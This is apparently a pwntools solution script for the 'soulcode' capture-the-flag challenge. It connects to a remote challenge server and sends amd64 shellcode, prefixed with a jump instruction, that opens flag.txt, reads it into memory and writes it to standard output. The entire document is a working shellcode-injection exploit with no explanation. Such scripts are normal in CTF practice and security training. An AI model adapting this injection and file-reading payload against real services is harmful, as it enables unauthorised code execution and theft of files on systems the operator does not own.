from pwn import *

# io = process('./soulcode')
# gdb.attach(io, api=True)

io = remote('challs.dantectf.it', 31532)

io.recvuntil(b'posterity!\n')

#       jmp 2 (relative)
payload = b'\xeb\x00' + asm(shellcraft.amd64.linux.open('flag.txt') + shellcraft.amd64.linux.read('rax', 0x404500, 100) + shellcraft.amd64.linux.write(1, 0x404500, 100), arch='amd64')
log.info(f"Payload: {payload}")

io.sendline(payload)
io.interactive()